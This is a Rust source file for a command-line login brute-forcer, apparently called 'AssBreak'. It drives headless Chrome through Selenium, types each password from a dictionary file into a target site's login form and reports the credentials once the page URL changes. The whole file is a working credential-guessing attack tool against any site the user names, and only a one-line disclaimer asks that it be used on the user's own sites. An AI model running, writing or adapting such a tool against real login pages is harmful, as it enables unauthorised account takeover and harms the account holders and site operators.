use std::fs::File;
use std::io::{self, BufRead, Read};
use std::io::Write;
use std::path::Path;
use std::str;
use std::thread;
use std::time::Duration;

use selenium_webdriver::*;

///
/// Coded by L14ms1 <l14ms1@outlook.fr>
/// last update 23:01 - 23/11/2020
/// LICENSE MIT
///

fn main() {
    print!("
:::'###:::::'######:::'######::'########::'########::'########::::'###::::'##:::'##:
::'## ##:::'##... ##:'##... ##: ##.... ##: ##.... ##: ##.....::::'## ##::: ##::'##::
:'##:. ##:: ##:::..:: ##:::..:: ##:::: ##: ##:::: ##: ##::::::::'##:. ##:: ##:'##:::
'##:::. ##:. ######::. ######:: ########:: ########:: ######:::'##:::. ##: #####::::
:#########::..... ##::..... ##: ##.... ##: ##.. ##::: ##...:::: #########: ##. ##:::
:##.... ##:'##::: ##:'##::: ##: ##:::: ##: ##::. ##:: ##::::::: ##.... ##: ##:. ##::
:##:::: ##:. ######::. ######:: ########:: ##:::. ##: ########: ##:::: ##: ##::. ##:
..:::::..:::......::::......:::........:::..:::::..::........::..:::::..::..::::..:: \n");
    println!("-------------------------------------------------------------------------------------");
    println!("Coded by L14ms1");
    println!("version : 0.1.4b");
    println!("Small disclaimer, you must use this project on your sites not on other people's sites, it only protects your site.");
    println!("-------------------------------------------------------------------------------------");

    // website for bruteforce
    print!("[~] The site you want to try brute-force : ");
    let website = read_input();

    // input username
    print!("[~] Enter the username selector : ");
    let username_input = read_input();

    // input password
    print!("[~] Enter the password selector : ");
    let password_input = read_input();

    // input button
    print!("[~] Enter the button (login) selector : ");
    let form_button = read_input();

    // username to crack
    print!("[~] Enter the username to brute-force : ");
    let username = read_input();

    // dictionary_password
    print!("[~] Enter the path of the password dictionary : ");
    let path_file = read_input();

    print!("[~] Do you want to see chrome in the middle of a brute force operation (yes or no) ? ");
    let chrome = read_input();
    let mut bool_chrome: bool;
    if chrome == "yes" {
        bool_chrome = true;
        println!("[!] The program will show you chrome and its brute-force operation");
    } else {
        bool_chrome = false;
        println!("[!] You will not see chrome however you will be able to see the logs.");
    }

    brute_force(website, username_input, password_input, form_button, username, path_file, bool_chrome);
}

fn brute_force(website: String, username: String, password: String, button: String, user: String, dictionary: String, show_chrome: bool) {
    if website != "" && username != "" && password != "" && button != "" && user != "" && dictionary != "" {
        if Path::new(dictionary.trim()).exists() {
            let mut args = vec![];
            if show_chrome == true {
                args = vec!["--disable-popup-blocking", "--disable-extensions"];
            } else {
                args = vec!["--headless", "--disable-popup-blocking", "--disable-extensions"];
            }

            let mut driver = Browser::start_session(BrowserName::Chrome, args);
            let _ = driver.open(&*website).unwrap();
            if let Ok(lines) = read_lines(dictionary.trim()) {
                let mut attempt = 0;
                for line in lines {
                    if let Ok(pass) = line {
                        let input_username = driver.find_element(LocatorStrategy::CSS(string_to_static_str(username.clone()))).unwrap();
                        let _ = input_username.send_keys(&*user);
                        let input_password = driver.find_element(LocatorStrategy::CSS(string_to_static_str(password.clone()))).unwrap();
                        let _ = input_password.send_keys(&*pass);
                        let btn = driver.find_element(LocatorStrategy::CSS(string_to_static_str(button.clone()))).unwrap();
                        attempt += 1;
                        let _ = btn.click();
                        let _ = driver.open(&*website).unwrap();
                        let mut link: String = driver.get_link().unwrap();
                        let _ = driver.refresh();
                        let _ = thread::sleep(Duration::new(2, 0));
                        link = driver.get_link().unwrap();
                        if website != link {
                            println!("[!] [TRIED] => SUCCESS | [PASSWORD] => {}, [USERNAME] => {}, ATTEMPT => {}", String::from(pass), user, attempt);
                            driver.close_browser();
                            pause();
                            break;
                        } else {
                            println!("[!] [TRIED] => FALSE | [PASSWORD] => {}, [USERNAME] => {}, ATTEMPT => {}", String::from(pass), user, attempt);
                            continue;
                        }
                    }
                }
            }
        } else {
            println!("[!] The file ({:?}) You put does not exist :/", dictionary);
            pause();
        }
    } else {
        println!("[!] Please complete all fields ...");
        pause();
    }
}

fn read_input() -> String {
    loop {
        let mut v = String::new();
        let _ = io::stdout().flush();
        match io::stdin().read_line(&mut v) {
            Ok(_) => {
                if !String::from(&v).is_empty() {
                    break v.replace("\r", "").replace("\n", "");
                } else {
                    continue;
                }
            }
            Err(_) => {
                println!("An error has occurred");
                continue;
            }
        }
    }
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>> where P: AsRef<Path>, {
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

fn string_to_static_str(s: String) -> &'static str {
    Box::leak(s.into_boxed_str())
}

fn pause() {
    write!(io::stdout(), "[!] Press any enter to quit...").unwrap();
    io::stdout().flush().unwrap();
    let _ = io::stdin().read(&mut [0u8]).unwrap();
}
